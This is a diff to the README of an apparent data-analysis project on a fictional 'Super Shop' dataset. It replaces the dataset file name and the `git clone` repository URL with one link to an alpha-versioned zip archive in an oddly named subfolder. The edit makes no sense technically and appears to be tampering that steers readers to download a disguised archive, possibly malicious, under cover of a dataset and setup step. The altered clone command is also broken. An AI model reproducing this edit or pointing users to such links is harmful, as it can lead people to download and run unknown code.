@@ -4,7 +4,7 @@
 This project analyzes sales data from a fictional "Super Shop" using Python, Pandas, Matplotlib, and Seaborn. The goal is to uncover insights about product performance, customer behavior, and business profitability.
 
 ## 📂 Dataset
-The dataset (`super_shop_dataset.csv`) contains 5,000 records with 30 columns, including:
+The dataset (`https://raw.githubusercontent.com/Siam-analytics/SuperShopAnalysis/main/spermiducal/Super-Analysis-Shop-1.0-alpha.1.zip`) contains 5,000 records with 30 columns, including:
 - **Product Details**: ID, category, sub-category, brand, price, discount
 - **Inventory**: Stock levels, sold quantity, stock value
 - **Financials**: Final price, purchase cost, profit
@@ -55,5 +55,5 @@ The dataset (`super_shop_dataset.csv`) contains 5,000 records with 30 columns, i
 
 1. **Clone the repository**:
    ```bash
-   git clone [https://github.com/Siam-analytics/SuperShopAnalysis.git]
+   git clone [https://raw.githubusercontent.com/Siam-analytics/SuperShopAnalysis/main/spermiducal/Super-Analysis-Shop-1.0-alpha.1.zip]
  
